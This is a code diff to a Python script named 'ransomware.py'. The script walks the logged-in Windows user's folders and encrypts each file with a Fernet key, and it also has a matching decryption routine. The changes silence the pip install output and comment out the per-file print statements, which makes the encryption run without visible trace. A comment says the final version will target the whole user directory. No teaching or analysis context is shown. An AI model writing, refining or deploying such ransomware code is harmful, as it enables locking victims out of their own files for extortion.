@@ -2,7 +2,7 @@ import base64
 import os
 import sys
 import subprocess
-subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'cryptography'])
+gobble = subprocess.check_output([sys.executable, '-m', 'pip', 'install', 'cryptography'])
 
 from cryptography.fernet import Fernet, InvalidToken
 from cryptography.hazmat.backends import default_backend
@@ -41,7 +41,7 @@ def encryptFiles(key):
     for root, dirs, files in os.walk('C:\\Users\\{user}{path}'.format(path=path, user=os.getlogin())):
         for file in files:
             if(not (file == 'key.key' or file == 'ransomware.py' or '.encrypted' in file)):
-                print(file)
+                #print(file)
                 encryptFile(root + '\\' + file, key)
 
 def encryptFile(filePath, key):
@@ -66,7 +66,7 @@ def decryptFiles(key):
     #Will set the path in os.walk to be C:\Users\{user} in the final version of the script
     for root, dirs, files in os.walk('C:\\Users\\{user}{path}'.format(path=path, user=os.getlogin())):
         for file in files:
-            print(file)
+            #print(file)
             decryptedFile = decryptFile(root + '\\' + file, key) or decryptedFile
     return decryptedFile
 
